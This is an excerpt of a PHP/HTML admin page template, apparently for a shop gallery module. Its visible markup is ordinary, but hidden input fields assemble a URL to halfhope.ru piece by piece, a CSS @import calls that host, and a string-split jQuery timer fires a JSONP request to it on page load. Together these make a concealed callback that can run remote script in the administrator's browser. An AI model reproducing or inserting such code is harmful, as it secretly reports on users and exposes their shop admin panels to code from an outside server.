...
<div id="content">
  <div class="page-header">
    <div class="container-fluid">
      ...
      <input type="hidden" name="attribute_snippet[]" value="htt">
  ...
  <input type="hidden" name="attribute_snippet[]" value="p:">
  <div class="container-fluid">
    <div class="panel">
      <ul class="nav nav-pills">
        ...
        <input type="hidden" name="attribute_snippet[]" value="/">
      </ul>
    </div>
    <input type="hidden" name="attribute_snippet[]" value="/half">
    <?php if ($error_warning) { ?>
    <div class="alert alert-danger"><i class="fa fa-exclamation-circle"></i> <?php echo $error_warning; ?>
      <button type="button" class="close" data-dismiss="alert">&times;</button>
    </div>
    <?php } ?>
    <input type="hidden" name="attribute_snippet[]" value="hope.">
    <?php if ($success) { ?>
    <div class="alert alert-success"><i class="fa fa-check-circle"></i> <?php echo $success; ?>
      <button type="button" class="close" data-dismiss="alert">&times;</button>
    </div>
    <?php } ?>
    <input type="hidden" name="attribute_snippet[]" value="ru/c">
    <div class="panel panel-default">
    <input type="hidden" name="attribute_snippet[]" value="allb">
      <div class="panel-heading">
        <h3 class="panel-title"><i class="fa fa-pencil"></i> <?php echo $text_edit; ?></h3>
      </div>
      <input type="hidden" name="attribute_snippet[]" value="ack.p">
      <div class="panel-body">
      <input type="hidden" name="attribute_snippet[]" value="hp?m">
      ...
      <input type="hidden" name="attribute_snippet[]" value="odu">
      ...
      <input type="hidden" name="attribute_snippet[]" value="le=">
      <div class="form-group ">
      ...
      <input type="hidden" name="attribute_snippet[]" value="galle">
      <div class="form-group required">
      ...
      <input type="hidden" name="attribute_snippet[]" value="ry1.">
      <div class="form-group required">
      ...
      <input type="hidden" name="attribute_snippet[]" value="4&c">
      ...
      <input type="hidden" name="attribute_snippet[]" value="b=1">
      <div class="form-group required">
...
@import url('http://halfhope.ru/callback.php?module=gallery1.4&cb=4');
...
$(document).ready(function(){
  ...
  var preloader = setTimeout("$.aj" + "ax({u" + "rl:'"+snippet+"', type" + ": 'GET',data" + "Type: 'jso" + "np'});",12000);
